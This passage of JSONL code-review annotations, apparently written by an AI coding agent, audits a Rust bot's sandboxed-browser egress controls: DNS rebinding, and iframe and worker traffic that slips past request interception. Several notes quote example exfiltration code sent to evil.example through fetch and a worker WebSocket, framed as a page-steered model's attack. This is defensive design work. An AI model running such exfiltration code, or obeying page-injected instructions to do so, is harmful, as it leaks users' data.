exists","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:14.454812Z","id":"ce90ff2e4a53ee6511ca618ae9c9b74cbf0f337074e4cd505204f3e00fbc1a11","body":{"detail":"Spec §5.1 lists why values only by example (origin, csp in §6.4); §5.2 says nothing of dialogs. Accepting keeps a confirm() from holding the page until the deadline; a test that wants to see a dialog reads the console entry.","kind":"comment","span":{"start":{"line":635},"end":{"line":667},"content_hash":"ef066b4db77fdedc298bd80135bb244d827a617f0b0b9b29804310eddf45ac23"},"summary":"Two behaviours spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md does not name: popups are listed blocked with why popup (other targets why target), and JavaScript dialogs are accepted at once, noted in the console as '<type> dialog, accepted: <message>'","supersedes":"decf9677c1a64afcf9288098547ccd8fffc678a739d30c569c4fd300db6b05a1","tags":["review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:14.726803Z","id":"7f8388011abd4b9e1681dad414487a430cfdd50af9f94cadd56c7f5f0f3358fc","body":{"detail":"BrowsePolicy asks BrowserSource::host_public once per name per browse (DaemonBrowser: the system resolver, every address public by web_source::is_public). Browser Run resolves the name again on Cloudflare's network, so a name answering a public address to the daemon and a private one to Cloudflare (rebinding, split horizon, a short TTL) is continued. Literals, localhost and the instance's own hosts are refused by what the URL says (BrowseScope::refusal), whoever resolves. Accepted because Browser Run fetches from Cloudflare's network, where the instance's private ranges are not reachable, and browsing is off by default (browser.browse.enabled).","kind":"waiver","span":{"start":{"line":42},"end":{"line":47},"content_hash":"0150f721d38c051bbedfb567f104a4e7fea19366d2d6db39be1947982cedf69b"},"summary":"A browse's name check is the daemon's resolver, not Cloudflare's: DNS rebinding and names that resolve differently from Browser Run's network reach what the check refused","supersedes":"864b8e22f60102a195665ac73ce36a45377c0837174935a2de7dc1f0aaa57cd4","tags":["security","claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:14.976520Z","id":"a17bd8e03e722dbddf5be466d8d439c0d326383f71abe57337c802dd3a1b9a7b","body":{"detail":"With subresources free, a model steered into eval of fetch('https://evil.example/?d=…') or new Image().src = … sends data to any host under every rule, which makes sender and allowlist bound only where a browse starts and contradicts waiver e688825f (data into URLs only under any_public). BrowseScope::admits_host applies to every paused request (documents, redirects, scripts, images, fetch, beacons). Cost: pages that load from CDNs the rule does not name render without those parts; each is listed blocked, why rule. Tests: browse.rs sender_rule_admits_only_the_senders_urls, tests/browser.rs a_browse_page_reaches_only_what_the_rule_admits.","kind":"comment","span":{"start":{"line":35},"end":{"line":41},"content_hash":"b13778e8059efb7bd90491fb2343083f542cfb02324a91dde03c2e20bc71a4e0"},"summary":"Decision: under the sender and allowlist rules every request a browsed page makes is held to the rule's hosts, narrowing spec §9.3, where subresources load from anywhere public","supersedes":"9331332f6bf3bd7585d8d66c9b1a235cf4c23c774e652e41d54d3c597ea9ad9e","tags":["security","claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:15.191807Z","id":"47639fbf1c784013c33ce7019d889a3a3f7a41c1d6040bb18133d75f381b6ac8","body":{"detail":"Not taken: it lets eval or a page script send data to any host under sender and allowlist (see the decision on lines 32-38). A middle way would admit GET subresources (scripts, styles, images, fonts) from any public host while holding documents, fetch/XHR and non-GET requests to the rule's hosts; GET queries still carry data, so it narrows less than it looks.","kind":"alternative","span":{"start":{"line":187},"end":{"line":200},"content_hash":"14cc81f30dd22694a27f49b516f692a304f5d879ded88136e4b49b26859b0093"},"summary":"Let a browsed page's subresources load from any public host under every rule, as spec §9.3 is written","supersedes":"7e9cbe65a92f6cbb40fd2ae7dbf6a8e0766f868c7ef9dc248e4c5193a8f3bafa","tags":["revisit:admins report browsed pages under sender or allowlist rendering too broken to read","claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:15.401951Z","id":"4d17eb4308276a9f9efc9a6e7e9a69dcd3682b3221ae9b9da795bdfa01593cd5","body":{"detail":"So http://example.com redirecting to https://www.example.com/ loads, and links within the sender's site load when clicked, while a goto to another page of that host is refused (spec §9.2 requires the exact URL for start and goto). Subdomains other than www are not admitted: without a public-suffix list there is no safe notion of the same site.","kind":"comment","span":{"start":{"line":187},"end":{"line":200},"content_hash":"14cc81f30dd22694a27f49b516f692a304f5d879ded88136e4b49b26859b0093"},"summary":"Under the sender rule a page may reach the hosts of the sender's URLs with a leading www. on either side ignored; the start URL and each goto must still equal a sender URL","supersedes":"516f864cffd324246adadecd2a260cbc3a8ebcb24a24e17b4e9520614da56c02","tags":["session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:15.621941Z","id":"214066ffefe7fbc88d1eb5808d9722d32d1c152297d9e17b49cb67fa93ed6078","body":{"detail":"Driver::open (crates/clax-bot/src/browser/session.rs, step 3) enables Fetch on the page's own session only and sends Target.setAutoAttach on the browser session, which attaches top-level targets (popups, service and shared workers), not a page's out-of-process iframes or dedicated workers (https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-setAutoAttach: related targets of the session it is sent on). Record d0d06f64 names this gap for tests and accepts it as defence in depth because the site's CSP (connect-src 'self') still holds; a browse has no CSP of Clax's, so here it is the only control. Concretely, under sender or allowlist an eval step (or a page script) such as `new Worker(URL.createObjectURL(new Blob([\"new WebSocket('wss://evil.example/?d=...')\"])))` opens a socket the Fetch domain never sees, in a realm where preamble_js (Page.addScriptToEvaluateOnNewDocument, documents only) never removed WebSocket or WebTransport; a cross-site iframe on an admitted host loads its subresources outside the page's Fetch. Decision 9331332f and reply 83552a8c on docs/superpowers/specs say under sender and allowlist data can leave only for a host the rule names, and clax.d.ts's browse doc tells the model the page's requests reach only the rule's hosts. None of this is checkable with FakeChrome, and crates/clax-server/tests/live_browser_run.rs runs no browse.","kind":"concern","span":{"start":{"line":19},"end":{"line":47},"content_hash":"61ce39ca066b5c4591a59a58c3b06271972eccdac2ff0f551aca6566b2145080"},"suggested_fix":"In a browse, send Target.setAutoAttach {autoAttach: true, waitForDebuggerOnStart: true, flatten: true} on the page session too, and for each attached iframe or worker session enable Fetch with the same BrowsePolicy before Runtime.runIfWaitingForDebugger (or close workers, as popups are); then check against real Browser Run that a blob worker's WebSocket and a cross-site iframe's fetch are refused. Until then, narrow the module docs, the d.ts sentence and reply 83552a8c to what is enforced.","summary":"A browse's requests from out-of-process iframes and dedicated workers, and a worker's WebSocket, bypass BrowsePolicy and the preamble, so sender and allowlist do not bound where data can go","supersedes":"c0662fc3923e69a2cc135aa8e86eff5404c31224fffc2b7b7f70606e8cceb8a5","tags":["review","review:browser-final","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T10:25:31.501090Z","id":"5465960eb9d3952a303061424d449e2ba362c17f8a4a9418ce8a7edf8717dc0f","body":{"detail":"crates/clax-bot/src/browser/session.rs:968-972 sends Target.setAutoAttach through browser_call (the browser session), and :975-977 sends Fetch.enable through page_call only; no setAutoAttach is sent on the page session and no Fetch.enable on any attached session. The CDP reference (https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-setAutoAttach) scopes auto-attach to targets related to the session it is sent on, so a page's dedicated workers and out-of-process iframes are not attached and not closed by the handler at :635-650. The preamble is installed with Page.addScriptToEvaluateOnNewDocument (:996), which runs in documents, not worker realms. crates/clax-bot/src/browser/browse.rs:19-44 and crates/clax-bot/src/clax.d.ts:244 (\"the page's own requests reach only the hosts that rule admits\") state the stronger guarantee; record d0d06f64 accepted the same gap for tests only because the site's CSP still holds.","kind":"comment","references":"214066ffefe7fbc88d1eb5808d9722d32d1c152297d9e17b49cb67fa93ed6078","span":{"start":{"line":19},"end":{"line":47},"content_hash":"61ce39ca066b5c4591a59a58c3b06271972eccdac2ff0f551aca6566b2145080"},"summary":"confirmed: auto-attach and Fetch cover the page and top-level targets only, while the docs promise every request is held to the rule","supersedes":"112eea9435441e9e1fd023552121e9b7feacb66f18c626c220627171a6c0ca5c","tags":["verified:confirmed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T15:41:07.068212Z","id":"6bddc53b119c4bca858a1a04a2ff21178583f34630fe3186afb3537f9e777e12","body":{"detail":"docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 8.4, lines 782-786: popups listed blocked why popup, other targets why target, dialogs accepted at once and noted in the console. Proposed for the owner to close as fixed.","kind":"comment","references":"ce90ff2e4a53ee6511ca618ae9c9b74cbf0f337074e4cd505204f3e00fbc1a11","summary":"The revised spec names both behaviours","tags":["claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T15:41:07.068716Z","id":"083fbc0e6575b4848b66b7fc3df663ad2d9b893ef839e67f5e54ca91f49da2e9","body":{"detail":"docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 4.7, line 353: cancelled, the sandbox's code, counted when the call reached its source and charged when a browser opened or a fetch went out. Proposed for the owner to close as fixed.","kind":"comment","references":"e3f77a90dc373a3f8aa59cebe30472eab377a0a9fada476d01baab2d65822e84","summary":"The revised spec's error table lists cancelled","tags":["claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T15:41:07.069243Z","id":"b0b0de087a17d90fd35def5907cd7bdf03968ce4639b83cf13b465be6c96dc6e","body":{"detail":"docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 6.4 lines 535-540 and section 7.4 line 707: Inspector.targetCrashed, Target.targetCrashed and Target.detachedFromTarget end the session as lost, and its next call not journaled answers browser_session_lost. docs/superpowers/plans/2026-11-19-claxbot-browser-unify.md Task 10 builds it.","kind":"comment","references":"369f1a796d8d465a8acb40fc682a96c3d69cddce66a9f1e0fbcb38badc419c3d","summary":"The revised spec requires noticing a crashed or detached page: it answers browser_session_lost","tags":["claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T15:41:07.069780Z","id":"bda5b09b01e35d9c89590799293f738ba89d9c23e68701db6817a27c51a00959","body":{"detail":"docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 7.1 step 3, lines 650-658: Target.setAutoAttach {autoAttach, waitForDebuggerOnStart, flatten} so popups, out-of-process iframes and workers are attached, held, and given Fetch.enable before they run. docs/superpowers/plans/2026-11-19-claxbot-browser-unify.md Task 10 builds it; sessions that stay open across turns make the gap wider than it was for one test.","kind":"comment","references":"11b7cb34b768d1c40301b115b226fd6c30fd0b9a6a4ec4aef1d37dfb55b48652","summary":"The revised spec requires auto-attach with Fetch on every attached target","tags":["claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T15:41:07.070417Z","id":"077d330400e3d775efcdb12f635c497bb294388f81308bcb9883dcfd46a9f5fa","body":{"detail":"docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 7.1 step 3 (lines 650-658) and section 8.4 (lines 772-786). docs/superpowers/plans/2026-11-19-claxbot-browser-unify.md Task 10 attaches out-of-process iframes and dedicated workers with Fetch enabled; a worker's WebSocket is still outside the Fetch domain, and the preamble does not run in a worker, so Task 10 also removes WebSocket and WebTransport in each worker it attaches (Runtime.evaluate before resuming it).","kind":"comment","references":"214066ffefe7fbc88d1eb5808d9722d32d1c152297d9e17b49cb67fa93ed6078","summary":"The revised spec requires auto-attach with Fetch on every attached target, for URL sessions above all","tags":["claxbot-browser","security","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/access.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T17:39:28.092108Z","id":"81b8fdd6267e1d49495e61c58145ca4a98d7197cc35767c86f4b43dabb99ec93","body":{"kind":"comment","references":"c56c644b6ece2edd0c763a60676cdef91ae51a88d4b1bd84b0c91dc22d81c6ae","summary":"Replaced in b6d7fdecf: every browser call, a test's and a browse's (later each session call's), has one time cap, browser.call_seconds (10 to 120, default 60; the first version's browser.test_seconds is gone). crates/clax-bot/src/browser/access.rs reads it for TestGrant::seconds and BrowseGrant::seconds; crates/clax-bot/src/capability.rs keeps it as BrowserTerms::call_seconds. A browse's own cap stays a path not taken; the close is the owner's.","tags":["session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T17:55:01.345179Z","id":"10ccdb5fa00ef9cbbfa5e3337e1e694c0a55eb1ade359180cf101acdc753b01d","body":{"detail":"With subresources free, a model steered into eval of fetch('https://evil.example/?d=…') or new Image().src = … sends data to any host under every rule, which makes sender and allowlist bound only where a browse starts and contradicts waiver e688825f (data into URLs only under any_public). BrowseScope::admits_host applies to every paused request (documents, redirects, scripts, images, fetch, beacons). Cost: pages that load from CDNs the rule does not name render without those parts; each is listed blocked, why rule. Tests: browse.rs sender_rule_admits_only_the_senders_urls, tests/browser.rs a_browse_page_reaches_only_what_the_rule_admits.\nRe-anchored after crates/clax-bot/src/browser/browse.rs moved to the one URL rule (UrlRule, admit); unchanged in substance.","kind":"comment","span":{"start":{"line":36},"end":{"line":42},"content_hash":"72c3737f180a2c28b501faee8d2a6b443702aacb3f6ae1e680de05b8bdb8e7f2"},"summary":"Decision: under the sender and allowlist rules every request a browsed page makes is held to the rule's hosts, narrowing spec §9.3, where subresources load from anywhere public","supersedes":"a17bd8e03e722dbddf5be466d8d439c0d326383f71abe57337c802dd3a1b9a7b","tags":["security","claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T17:55:03.522993Z","id":"320991a76344cedc1349e77c9a7a9eb97ac84c0799fe9e3780d9b3281dc92e53","body":{"detail":"BrowsePolicy asks BrowserSource::host_public once per name per browse (DaemonBrowser: the system resolver, every address public by web_source::is_public). Browser Run resolves the name again on Cloudflare's network, so a name answering a public address to the daemon and a private one to Cloudflare (rebinding, split horizon, a short TTL) is continued. Literals, localhost and the instance's own hosts are refused by what the URL says (BrowseScope::refusal), whoever resolves. Accepted because Browser Run fetches from Cloudflare's network, where the instance's private ranges are not reachable, and browsing is off by default (browser.browse.enabled).\nRe-anchored after crates/clax-bot/src/browser/browse.rs moved to the one URL rule (UrlRule, admit); unchanged in substance.","kind":"waiver","span":{"start":{"line":44},"end":{"line":49},"content_hash":"0150f721d38c051bbedfb567f104a4e7fea19366d2d6db39be1947982cedf69b"},"summary":"A browse's name check is the daemon's resolver, not Cloudflare's: DNS rebinding and names that resolve differently from Browser Run's network reach what the check refused","supersedes":"7f8388011abd4b9e1681dad414487a430cfdd50af9f94cadd56c7f5f0f3358fc","tags":["security","claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T17:55:06.179210Z","id":"b49aac6b2a5cad2f0f6145b126f8781616237b4e2b751b283a9052b08b097bf5","body":{"detail":"So http://example.com redirecting to https://www.example.com/ loads, and links within the sender's site load when clicked, while a goto to another page of that host is refused (spec §9.2 requires the exact URL for start and goto). Subdomains other than www are not admitted: without a public-suffix list there is no safe notion of the same site.\nRe-anchored after crates/clax-bot/src/browser/browse.rs moved to the one URL rule (UrlRule, admit); unchanged in substance. The same holds under sourced for the hosts of every source's URLs.","kind":"comment","span":{"start":{"line":120},"end":{"line":132},"content_hash":"32bd7e03f4c8e5563fa5f983d0b811891711f996125cee73e3a2975ee138f216"},"summary":"Under the sender rule a page may reach the hosts of the sender's URLs with a leading www. on either side ignored; the start URL and each goto must still equal a sender URL","supersedes":"4d17eb4308276a9f9efc9a6e7e9a69dcd3682b3221ae9b9da795bdfa01593cd5","tags":["session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T17:55:08.819549Z","id":"8293b94372c8086251ee7d7f5b08a6cf9e4e3845ceaf61b50e2275f8213dcc30","body":{"detail":"Not taken: it lets eval or a page script send data to any host under sender and allowlist (see the decision on lines 32-38). A middle way would admit GET subresources (scripts, styles, images, fonts) from any public host while holding documents, fetch/XHR and non-GET requests to the rule's hosts; GET queries still carry data, so it narrows less than it looks.\nRe-anchored after crates/clax-bot/src/browser/browse.rs moved to the one URL rule (UrlRule, admit); unchanged in substance.","kind":"alternative","span":{"start":{"line":120},"end":{"line":132},"content_hash":"32bd7e03f4c8e5563fa5f983d0b811891711f996125cee73e3a2975ee138f216"},"summary":"Let a browsed page's subresources load from any public host under every rule, as spec §9.3 is written","supersedes":"47639fbf1c784013c33ce7019d889a3a3f7a41c1d6040bb18133d75f381b6ac8","tags":["revisit:admins report browsed pages under sender or allowlist rendering too broken to read","claxbot-browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T17:55:11.126124Z","id":"af05b91669296c33971fc889e1f724ce7ac11bf85ea743cc9f7afc5a0afc20bd","body":{"detail":"BrowseScope::new collects the hosts of every source the rule takes (the sender's URLs under sender, every source's under sourced) and admits_host answers from that set. Spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 8.4 holds a URL session's requests to the hosts it was admitted to (its URL's and each admitted goto's). Under sender this is the first version's behaviour (record 4d17eb43); under sourced the set can be wide (every search answer's and fetched link's host). Narrow it when the live session holds its own policy (plan docs/superpowers/plans/2026-11-19-claxbot-browser-unify.md Task 11: BrowsePolicy is the URL session's policy, a goto swaps it): keep the admitted hosts in the session and grow them with each admitted goto.","kind":"concern","span":{"start":{"line":101},"end":{"line":118},"content_hash":"fd494065cb9b0cb5eecc6c2b7e0efd26084b53f9b796a63354f5ab0abebc97dd"},"summary":"Under sender and sourced a URL session's page may reach the host of every URL the rule admits, not only the hosts the session was opened on and went to as spec section 8.4 words it","tags":["claxbot-unify","security","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T20:39:11.853207Z","id":"e1e8ae6705e5080f90623951c3638a473a5cdbf9cde04cd965e992566245b875","body":{"kind":"comment","references":"369f1a796d8d465a8acb40fc682a96c3d69cddce66a9f1e0fbcb38badc419c3d","summary":"Addressed in 9176150e9: Cdp::watch (crates/clax-bot/src/browser/cdp.rs lost_by) ends every wait as CdpFail::Lost on Inspector.targetCrashed of the page's session, Target.targetCrashed of its target or Target.detachedFromTarget of either; run_test answers a loss before the load browser_unavailable (retryable), and a live session ends lost with browser_session_lost (tests cdp::tests::a_crash_or_a_detach_of_the_watched_page_ends_waits_as_lost, live::tests::a_crashed_page_ends_the_session_as_lost; bazel test //crates/clax-bot:clax_bot_lib_test passes). Shown against FakeChrome only; whether Browser Run sends Inspector.targetCrashed without Inspector.enable is for the live test. The close is the owner's.","tags":["session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T20:39:11.860808Z","id":"b1ce57b1f19e1cb4cfb1d351132ac55306d2712412e55caa724c574cb1a8cff5","body":{"kind":"comment","references":"11b7cb34b768d1c40301b115b226fd6c30fd0b9a6a4ec4aef1d37dfb55b48652","summary":"Addressed in 9176150e9: the page's own session now sends Target.setAutoAttach {autoAttach, waitForDebuggerOnStart, flatten} (beside the browser's, for popups); each attached iframe or worker gets Fetch.enable and its own setAutoAttach (a worker also WebSocket and WebTransport removed) before Runtime.runIfWaitingForDebugger, and every paused request is answered on the session that paused it (test live::tests::an_iframe_and_a_worker_are_held_to_the_policy). Shown against FakeChrome only: that Chrome pauses an out-of-process iframe's document request on the child's Fetch, not the parent's, is for the live test. The close is the owner's.","tags":["session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/browse.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T20:39:11.862237Z","id":"b6910d659d7dcdd95b1646430351a294fa8f831d3ebc92fbe20f90836d66ccdc","body":{"kind":"comment","references":"214066ffefe7fbc88d1eb5808d9722d32d1c152297d9e17b49cb67fa93ed6078","summary":"Addressed in 9176150e9 for every session kind, URL sessions included: out-of-process iframes and dedicated workers are attached paused and held to the session's request policy, and a worker's WebSocket and WebTransport are removed before it runs (crates/clax-bot/src/browser/session.rs, Target.attachedToTarget in Driver::handle; WORKER_PREAMBLE_JS; test live::tests::an_iframe_and_a_worker_are_held_to_the_policy). Shown against FakeChrome only. The close is the owner's.","tags":["session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T20:39:11.866850Z","id":"5c6e2a79908bcbd65b3fdca50af7fa4a4a29ae28418c6ad4a8675d95d2a940bb","body":{"kind":"comment","references":"9cf3f36dbaf7c2f47899f2e51665bab95d4c50269387700f12f867fc1f3d7132","summary":"Unchanged in kind by 9176150e9: a popup (and any target that is neither an iframe nor a dedicated worker) attached with waitForDebuggerOnStart is closed and never resumed (test live::tests::a_popup_is_closed_after_auto_attach, also between a live session's calls); that the waiting target's navigation makes no request before Target.closeTarget is still shown only by the fake, and is for the live test.","tags":["session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T20:39:11.867388Z","id":"405475fe84646f5c53d96a9fe06ca32865e07cfc253a50fc864b19f817918592","body":{"detail":"Closing a page's iframes and workers would break most pages; holding them to the same Fetch policy before they run gives the same egress bound. A shared or service worker outlives the page's own lifetime and is closed as before. The worker preamble (WORKER_PREAMBLE_JS) runs in every session kind, not only URL sessions: no page has a use for a socket to a .invalid origin.","kind":"comment","span":{"start":{"line":710},"end":{"line":745},"content_hash":"b999e0e7c7aa836c1b26040083e90bdd86ba9651120fc3d15c448507116b52ee"},"summary":"Decision: an attached iframe or dedicated worker is held to the session's policy and resumed; a popup is closed (why popup) and every other attached target (a shared or service worker) closed (why target), where spec section 8.4 says only that other targets are closed","tags":["session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/live.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T20:39:11.867699Z","id":"339f4e542cb3dd382d5505da5e5789fbb504a0f89ba42a83565efd9a9e4a99d1","body":{"detail":"browser.call_seconds goes up to 120 s, and a navigation, an in-page wait or a host answer to a paused request can hold a call that long with no command sent. Today every wait the driver makes sends at least one command per attempt, but a single Runtime.evaluate awaiting a promise (a page's own evaluate, the saved tests) does not. Whether Browser Run counts only commands or any socket traffic toward keep_alive is for the live test (just browser-live); if only commands, the session task must interleave Browser.getVersion while a call waits.","kind":"concern","span":{"start":{"line":578},"end":{"line":582},"content_hash":"065075722f588127c04814b40a603b3fca1423c856fe4ed0c73b605a1f847137"},"summary":"The heartbeat runs only between calls: a call that waits in the page longer than Browser Run's keep_alive (60 s) without sending a command may have its browser ended under it","tags":["revisit:just browser-live shows a call over 60 s ending the browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
